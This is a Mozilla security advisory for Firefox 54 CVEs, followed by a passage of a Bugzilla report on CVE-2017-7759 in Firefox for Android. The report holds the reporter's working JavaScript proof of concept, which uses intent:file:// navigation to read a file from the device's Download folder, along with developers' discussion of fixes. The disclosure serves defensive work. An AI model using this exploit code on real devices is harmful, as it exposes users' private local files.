#### [#CVE-2017-7778: Vulnerabilities in the Graphite 2 library](#CVE-2017-7778)

Reporter
Holger Fuhrmannek, Tyson Smith
Impact
high
##### Description

A number of security vulnerabilities in the Graphite 2 library including out-of-bounds reads, buffer overflow reads and writes, and the use of uninitialized memory. These issues were addressed in Graphite 2 version 1.3.10.

##### References

* [Graphite2 lz4::decompress out of bounds write (CVE-2017-7778)](https://bugzilla.mozilla.org/show_bug.cgi?id=1349310)
* [Graphite2 out of bounds read [@ graphite2::Pass::readPass] (CVE-2017-7771)](https://bugzilla.mozilla.org/show_bug.cgi?id=1350047)
* [Graphite2 heap-buffer-overflow write [@ lz4::decompress] (CVE-2017-7772)](https://bugzilla.mozilla.org/show_bug.cgi?id=1352745)
* [Graphite2 heap-buffer-overflow write [@ lz4::decompress] src/Decompressor (CVE-2017-7773)](https://bugzilla.mozilla.org/show_bug.cgi?id=1352747)
* [Graphite2 out of bounds read [@ graphite2::Silf::readGraphite] (CVE-2017-7774)](https://bugzilla.mozilla.org/show_bug.cgi?id=1355174)
* [Graphite2 Assertion 'size() > n' failed (CVE-2017-7775)](https://bugzilla.mozilla.org/show_bug.cgi?id=1355182)
* [Graphite2 heap-buffer-overflow read [@ graphite2::Silf::getClassGlyph] (CVE-2017-7776)](https://bugzilla.mozilla.org/show_bug.cgi?id=1356607)
* [Graphite2 use of uninitialized memory [@ graphite2::GlyphCache::Loader::read\_glyph] (CVE-2017-7777)](https://bugzilla.mozilla.org/show_bug.cgi?id=1358551)

#### [#CVE-2017-7758: Out-of-bounds read in Opus encoder](#CVE-2017-7758)

Reporter
Nicolas Trippar of Zimperium zLabs
Impact
high
##### Description

An out-of-bounds read vulnerability with the Opus encoder when the number of channels in an audio stream changes while the encoder is in use.

##### References

* [Bug 1368490](https://bugzilla.mozilla.org/show_bug.cgi?id=1368490)

#### [#CVE-2017-7759: Android intent URLs can cause navigation to local file system](#CVE-2017-7759)

Reporter
Takeshi Terada
Impact
high
##### Description

Android intent URLs given to Firefox for Android can be used to navigate from HTTP or HTTPS URLs to local `file:` URLs, allowing for the reading of local data through a violation of same-origin policy.
*Note: This attack only affects Firefox for Android. Other operating systems are not affected.*

##### References

* [Bug 1356893](https://bugzilla.mozilla.org/show_bug.cgi?id=1356893)

#### [#CVE-2017-7760: File manipulation and privilege escalation via callback parameter in Mozilla Windows Updater and Maintenance Service](#CVE-2017-7760)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

The Mozilla Windows updater modifies some files to be updated by reading the original file and applying changes to it. The location of the original file can be altered by a malicious user by passing a special path to the callback parameter through the Mozilla Maintenance Service, allowing the manipulation of files in the installation directory and privilege escalation by manipulating the Mozilla Maintenance Service, which has privileged access.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1348645](https://bugzilla.mozilla.org/show_bug.cgi?id=1348645)

#### [#CVE-2017-7761: File deletion and privilege escalation through Mozilla Maintenance Service helper.exe application](#CVE-2017-7761)

Reporter
Holger Fuhrmannek
Impact
moderate
##### Description

The Mozilla Maintenance Service `helper.exe` application creates a temporary directory writable by non-privileged users. When this is combined with creation of a junction (a form of symbolic link), protected files in the target directory of the junction can be deleted by the Mozilla Maintenance Service, which has privileged access.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1215648](https://bugzilla.mozilla.org/show_bug.cgi?id=1215648)
* [Code execution / Privilege escalation problems with NSIS installers](https://sourceforge.net/p/nsis/bugs/1125/)

#### [#CVE-2017-7762: Addressbar spoofing in Reader mode](#CVE-2017-7762)

Reporter
Jun Kokatsu
Impact
moderate
##### Description

When entered directly, Reader Mode did not strip the username and password section of URLs displayed in the addressbar. This can be used for spoofing the domain of the current page.

##### References

* [Bug 1358248](https://bugzilla.mozilla.org/show_bug.cgi?id=1358248)

#### [#CVE-2017-7763: Mac fonts render some unicode characters as spaces](#CVE-2017-7763)

Reporter
Michał Bentkowski
Impact
moderate
##### Description

Default fonts on OS X display some Tibetan characters as whitespace. When used in the addressbar as part of an IDN this can be used for domain name spoofing attacks.
*Note: This attack only affects OS X operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1360309](https://bugzilla.mozilla.org/show_bug.cgi?id=1360309)

#### [#CVE-2017-7764: Domain spoofing with combination of Canadian Syllabics and other unicode blocks](#CVE-2017-7764)

Reporter
Samuel Erb
Impact
moderate
##### Description

Characters from the "Canadian Syllabics" unicode block can be mixed with characters from other unicode blocks in the addressbar instead of being rendered as their raw "punycode" form, allowing for domain name spoofing attacks through character confusion. The current Unicode standard allows characters from "Aspirational Use Scripts" such as Canadian Syllabics to be mixed with Latin characters in the "moderately restrictive" IDN profile. We have changed Firefox behavior to match the upcoming Unicode version 10.0 which removes this category and treats them as "Limited Use Scripts."

##### References

* [Bug 1364283](https://bugzilla.mozilla.org/show_bug.cgi?id=1364283)
* [Proposed Update to Unicode Standard Annex](http://www.unicode.org/reports/tr31/tr31-26.html#Aspirational_Use_Scripts)

#### [#CVE-2017-7765: Mark of the Web bypass when saving executable files](#CVE-2017-7765)

Reporter
Jonathan Birch and Microsoft Vulnerability Research
Impact
moderate
##### Description

The "Mark of the Web" was not correctly saved on Windows when files with very long names were downloaded from the Internet. Without the Mark of the Web data, the security warning that Windows displays before running executables downloaded from the Internet is not shown.
*Note: This attack only affects Windows operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1273265](https://bugzilla.mozilla.org/show_bug.cgi?id=1273265)

#### [#CVE-2017-7766: File execution and privilege escalation through updater.ini, Mozilla Windows Updater, and Mozilla Maintenance Service](#CVE-2017-7766)

Reporter
Seb Patane
Impact
high
##### Description

An attack using manipulation of `updater.ini` contents, used by the Mozilla Windows Updater, and privilege escalation through the Mozilla Maintenance Service to allow for arbitrary file execution and deletion by the Maintenance Service, which has privileged access.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1342742](https://bugzilla.mozilla.org/show_bug.cgi?id=1342742)

#### [#CVE-2017-7767: Privilege escalation and arbitrary file overwrites through Mozilla Windows Updater and Mozilla Maintenance Service](#CVE-2017-7767)

Reporter
Seb Patane
Impact
moderate
##### Description

The Mozilla Maintenance Service can be invoked by an unprivileged user to overwrite arbitrary files with junk data using the Mozilla Windows Updater, which runs with the Maintenance Service's privileged access.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1336964](https://bugzilla.mozilla.org/show_bug.cgi?id=1336964)

#### [#CVE-2017-7768: 32 byte arbitrary file read through Mozilla Maintenance Service](#CVE-2017-7768)

Reporter
Seb Patane
Impact
moderate
##### Description

The Mozilla Maintenance Service can be invoked by an unprivileged user to read 32 bytes of any arbitrary file on the local system by convincing the service that it is reading a status file provided by the Mozilla Windows Updater. The Mozilla Maintenance Service executes with privileged access, bypassing system protections against unprivileged users.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1336979](https://bugzilla.mozilla.org/show_bug.cgi?id=1336979)

#### [#CVE-2017-7770: Addressbar spoofing with JavaScript events and fullscreen mode](#CVE-2017-7770)

Reporter
Jordi Chancel
Impact
moderate
##### Description

A mechanism where when a new tab is loaded through JavaScript events, if fullscreen mode is then entered, the addressbar will not be rendered. This would allow a malicious site to displayed a spoofed addressbar, showing the location of an arbitrary website instead of the one loaded.
*Note: this issue only affects Firefox for Android. Desktop Firefox is unaffected.*

##### References

* [Bug 1317242](https://bugzilla.mozilla.org/show_bug.cgi?id=1317242)

#### [#CVE-2017-5471: Memory safety bugs fixed in Firefox 54](#CVE-2017-5471)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Mats Palmgren, Philipp, Byron Campen, Christian Holler, Gary Kwong, Benjamin Bouvier, Bob Clary, Jon Coppeard, and Michael Layzell reported memory safety bugs present in Firefox 53. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 54](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1349604%2C1318645%2C1361098%2C1361100%2C1341026%2C1349421%2C1360852%2C1299147%2C1352073%2C1354853%2C1366446%2C1342181%2C1343069)

#### [#CVE-2017-5470: Memory safety bugs fixed in Firefox 54 and Firefox ESR 52.2](#CVE-2017-5470)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Tyson Smith, Mats Palmgren, Philipp, Masayuki Nakano, Christian Holler, Andrew McCreight, Gary Kwong, André Bargull, Carsten Book, Jesse Schwartzentruber, Julian Hector, Marcia Knous, Ronald Crane, and Nils Ohlmeier reported memory safety bugs present in Firefox 53 and Firefox ESR 52.1. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 54 and Firefox ESR 52.2](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1359639%2C1349595%2C1352295%2C1352556%2C1342552%2C1342567%2C1346012%2C1366140%2C1368732%2C1297111%2C1362590%2C1357462%2C1363280%2C1349266%2C1352093%2C1348424%2C1347748%2C1356025%2C1325513%2C1367692)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.2/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_bfb80c00_20250124_192245.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1356893)
* [XML](/show_bug.cgi?ctype=xml&id=1356893)

Closed
[Bug 1356893](/show_bug.cgi?id=1356893)
(CVE-2017-7759)

Opened 8 years ago
Closed 8 years ago

# Firefox for Android allows navigating from http: to file: URLs

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Firefox for Android allows navigating from http: to file: URLs

## Categories

### (Firefox for Android Graveyard :: General, defect)

[Product:](/describecomponents.cgi?product=Firefox%20for%20Android%20Graveyard)

Firefox for Android Graveyard
▾

Firefox for Android Graveyard
Old, retired Fennec bugs. Fennec is the code name of the effort to build a mobile version of Firefox ([more info](http://wiki.mozilla.org/Mobile/FennecVision))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox%20for%20Android%20Graveyard&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox%20for%20Android%20Graveyard)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox%20for%20Android%20Graveyard&component=General#General)

General
▾

Firefox for Android Graveyard :: General
For bugs in Fennec which do not fit into other more specific Fennec components.
[See Open Bugs in This Component](/buglist.cgi?product=Firefox%20for%20Android%20Graveyard&component=General&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox%20for%20Android%20Graveyard&component=General&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox%20for%20Android%20Graveyard&component=General)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

52 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

## Tracking

### (fennec+, firefox-esr52 wontfix, firefox53 wontfix, firefox54+ verified, firefox55+)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Firefox 55

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| fennec | [+](/buglist.cgi?f1=cf_blocking_fennec&o1=equals&v1=%2B) | --- |
| firefox-esr52 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=wontfix) |
| firefox53 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox53&o1=equals&v1=wontfix) |
| firefox54 | [+](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=verified) |
| firefox55 | [+](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%2B) | --- |

|  | Tracking | Status |
| --- | --- | --- |
| fennec | + |  |
| firefox-esr52 |  | wontfix |
| firefox53 |  | wontfix |
| firefox54 | + | verified |
| firefox55 | + |  |

## People

### (Reporter: websec02.g02, Assigned: esawin)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/decb4bac92d9ff3d3552518c614f7e4c?d=mm&size=40)  [esawin](/user_profile?user_id=495422)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/a37f6eccc162f4ab0121d43312480dbe?d=mm&size=40)  [websec02.g02](/user_profile?user_id=448978)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

---

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

29 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1374200](/show_bug.cgi?id=1374200 "RESOLVED FIXED - Crash in java.lang.NoSuchMethodError: android.net.Uri.normalizeScheme at org.mozilla.gecko.IntentHelper.getOpenURIIntentInner(IntentHelper.java)")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=1356893&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1356893)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2017-5463](/show_bug.cgi?id=1338867 "RESOLVED FIXED - Fennec allows address bar spoofing in reader view with userinfo field in front of hostname of url")

## Details

### (Keywords: csectype-sop, reporter-external, sec-high, Whiteboard: [post-critsmash-triage][adv-main54+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2017-7759

[Keywords:](/describekeywords.cgi)

[csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[post-critsmash-triage][adv-main54+]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a5532775_1689 "8 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (2 files, 1 obsolete file)

| [PoC](/attachment.cgi?id=8858649)  [8 years ago](#c1)  [Takeshi Terada](/user_profile?user_id=448978)   820 bytes, text/html |  | [Details](/attachment.cgi?id=8858649&action=edit) |
| --- | --- | --- |
| [0001-Bug-1356893-1.0-Reject-opening-intents-with-file-dat.patch](/attachment.cgi?id=8862432)  [8 years ago](#c11)  [Eugen Sawin [:esawin]](/user_profile?user_id=495422)   890 bytes, patch | sebastian : [review+](#c12 "8 years ago")  nalexander : [feedback+](#c13 "8 years ago")  maliu : [feedback+](#c14 "8 years ago") | [Details](/attachment.cgi?id=8862432&action=edit) | [Diff](/attachment.cgi?id=8862432&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862432) |
| [0001-Bug-1356893-1.1-Reject-opening-intents-with-file-dat.patch](/attachment.cgi?id=8862510)  [8 years ago](#c15)  [Eugen Sawin [:esawin]](/user_profile?user_id=495422)   999 bytes, patch | nalexander : [review+](#c16 "8 years ago")  jcristau : [approval-mozilla-beta+](#c31 "8 years ago")  dveditz : [sec-approval+](#c22 "8 years ago") | [Details](/attachment.cgi?id=8862510&action=edit) | [Diff](/attachment.cgi?id=8862510&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1356893&attachment=8862510) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Takeshi Terada](/user_profile?user_id=448978)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1356893#c0)• 8 years ago |
|  | |

User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Build ID: 20170323105023
Firefox for Android
Steps to reproduce:
Visit an remote (http) webpage:
<script>
location="intent:file:///(path)#Intent;type=text/html;end";
</script>
Actual results:
The JS code above redirects the user to file: URL.
The redirection allows remote pages to exfiltrate files in /sdcard/Download/.
Here is a PoC that steals "secret" file in Download directory:
<body style=font-size:300%>
<h1>remote\_attack.html</h1>
<p>Downloading local\_attack.html.</p>
<a id=a0 href="data:text/html,<body style=font-size:300%>
<h1>local\_attack.html</h1>
<p>Reading /sdcard/Download/secret.</p>
<script>
var xhr=new XMLHttpRequest();
xhr.open('GET', 'secret', true);
xhr.onreadystatechange = function() {
if (xhr.readyState == 4) alert(xhr.responseText)
};
xhr.send();
</script>" download="local\_attack.html">
<script>
// Attacker first downloads his attack page (local\_attack.html) to sdcard
a0.click();
// Then navigates to the file with file scheme.
// (The file path below might need adjustment depending on the device)
setTimeout(function() {
location="intent:file:///storage/emulated/0/Download/local\_attack.html#Intent;type=text/html;end";
}, 2000);
</script>
I confirmed the code works in Firefox for android v52.0.2 (Nexus 5x).
Expected results:
Navigation from http/https URLs to file URLs should be blocked.

|  | [Takeshi Terada](/user_profile?user_id=448978)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1356893#c1)• 8 years ago |
|  | |

Attached file
[PoC](attachment.cgi?id=8858649)
— [Details](attachment.cgi?id=8858649&action=edit)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1356893#c2)• 8 years ago |
|  | |

I would expect this to hit protocol linking checks in CAPS which shouldn't be allowing this. Sebastian, is the intent: protocol magical in some way?
(I expect the PoC doesn't work without the intent: but I haven't checked either way.)Flags: needinfo?(s.kaspari)

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1356893#c3)• 8 years ago |
|  | |

> I would expect this to hit protocol linking checks in CAPS which shouldn't be allowing this.
We don't implement the "intent" protocol internally, as far as I can tell. Or at least I have not yet found a protocol handler for it.
So it's possible that we hand it off to the OS, and the OS is what strips off the "intent:" bit and then hands the file:// URL right back to us to load (e.g. based on the MIME type).

|  | [Takeshi Terada](/user_profile?user_id=448978)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1356893#c4)• 8 years ago |
|  | |

Intent (and android-app) scheme is handled in IntentHelper.java.
<https://dxr.mozilla.org/mozilla-central/source/mobile/android/base/java/org/mozilla/gecko/IntentHelper.java>
> I expect the PoC doesn't work without the intent: but I haven't checked either way.
Right. Navigation from http: to file: is blocked in Firefox for Android for security reasons, and of course the same is true in desktop version. The intent: URL allows bypassing the restriction.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1356893#c5)• 8 years ago |
|  | |

If we're the ones extracting the file:// URL from the intent: thing, then we should absolutely do a CheckLoadURI check at that point.
nalexander, do you know something about this code?Component: Untriaged → GeneralFlags: needinfo?(nalexander)Product: Firefox → Firefox for Android

|  | [Nick Alexander :nalexander [he/him]](/user_profile?user_id=432887) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1356893#c6)• 8 years ago |
|  | |

(In reply to Boris Zbarsky [:bz] (still a bit busy) (if a patch has no decent message, automatic r-) from [comment #5](/show_bug.cgi?id=1356893#c5 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs"))
> If we're the ones extracting the file:// URL from the intent: thing, then we
> should absolutely do a CheckLoadURI check at that point.
Looks like we aren't. I haven't verified this, but my expectation is that the flow goes:
1) Fennec recognizes the intent:// URL
2) Fennec passes the intent:// URL to Android
3) Android knows that Fennec can open file:// URLs
4) Fennec happily loads the file:// URL.
I expect the file:// URL to be loaded in a new tab (i.e. new browsing context), just as if you tapped a file:// link in an Android file manager -- although I haven't verified this. It \*might\* be possible to use the EXTRA\_APPLICATION\_ID, or even non-standard Fennec intent options, to load in the same tab, although we'd need to experiment to figure out if there's danger here. See <https://dxr.mozilla.org/mozilla-central/rev/c697e756f738ce37abc56f31bfbc48f55625d617/mobile/android/base/java/org/mozilla/gecko/Tabs.java#996>.
There seem to be two things here:
1) intent: allows to open file:// URLs. We need to fix this. This intent: stuff is totally non-standard; we should figure out what Chrome does on Android and do as close to the same thing as possible. I very much doubt we can robustly "track" a URL through Fennec -> Android -> Fennec again, so we might need to parse some of these intent: URLs and drop dangerous ones on the floor. It's very difficult to differentiate dangerous ones on Android though, since the scheme is so general. Maybe somebody else knows more about this and can comment.
2) a page is able to \_write\_ file:// URLs (without user action). Isn't that much, much more significant? Does the "a0.click()" actually work and silently write file:// URLs in Firefox for Android? That's not the web interaction model I'm aware of.
> nalexander, do you know something about this code?
Not really, but I'll redirect to mcomella, who definitely did, and CC rnewman, who's done work in this area, and we'll find an owner.
Thanks for the report, Takeshi! Clever!Flags: needinfo?(nalexander) → needinfo?(michael.l.comella)Summary: Firefox for android allows navigating from http: to file: URLs → Firefox for Android allows navigating from http: to file: URLs

|  | [Takeshi Terada](/user_profile?user_id=448978)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1356893#c7)• 8 years ago |
|  | |

Let me add some comments.
1)
Chrome also accepts intent: URLs and, because of this, it allows navigating from http: to file: like Firefox does. The difference is that Chrome assigns an unique origin to file: URLs, so the attack cannot be simply applied to Chrome.
Regarding how to fix the issue, please look at the Firefox source code handling intent: URLs:
<https://dxr.mozilla.org/mozilla-central/source/mobile/android/base/java/org/mozilla/gecko/IntentHelper.java#277>
Intent.parseUri(), which is a part of Android framework, creates an intent from a given intent: URL.
Line 283-288 are the security checks to ensure that only BROWSABLE activities are launched by the intent.
I guess a new check, blocking file: URL if the intent is resolved to Firefox itself, should be introduced here.
2)
AFAIK, Firefox (desktop) and IE ask user's consent before downloading a file, while Edge, Chrome, Firefox (android) and Safari don't. I think the former is better in terms of security. That's especially true in Android, because downloaded files may contain secret and all the installed apps with READ\_EXTERNAL\_STORAGE permission can read downloaded files.

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1356893#c8)• 8 years ago |
|  | |

Another option is to change the same-origin policy for file:// URIs on Android (or perhaps pref-controlled, with the pref set on Android) to be stricter, more like Chrome's. Unlike desktop, there should be no issue with this breaking help systems delivered via file:// or whatnot.
I \_think\_ all we need to do for that is make NS\_RelaxStrictFileOriginPolicy return false. I'm a little surprised we don't have a pref for that already...Flags: needinfo?(dveditz)

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a119653_20209)• 8 years ago |

Status: UNCONFIRMED → NEWEver confirmed: true

|  | [Sebastian Kaspari (:sebastian; :pocmo)](/user_profile?user_id=472516) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a149991_472516)• 8 years ago |

Flags: needinfo?(s.kaspari)

|  | [Sebastian Kaspari (:sebastian; :pocmo)](/user_profile?user_id=472516) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a150017_472516)• 8 years ago |

tracking-fennec: --- → ?

|  | [Nick Alexander :nalexander [he/him]](/user_profile?user_id=432887) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a171521_432887)• 8 years ago |

See Also: → [CVE-2017-5463](/show_bug.cgi?id=1338867 "RESOLVED FIXED - Fennec allows address bar spoofing in reader view with userinfo field in front of hostname of url")

|  | [James Willcox (:snorp) (jwillcox@mozilla.com) (he/him)](/user_profile?user_id=227322) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1356893#c9)• 8 years ago |
|  | |

Eugen can write a patch for this once we figure out what needs to be done.Assignee: nobody → esawin

|  | [James Willcox (:snorp) (jwillcox@mozilla.com) (he/him)](/user_profile?user_id=227322) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a344772_227322)• 8 years ago |

tracking-fennec: ? → 54+

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1356893#a349770_280903)• 8 years ago |

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
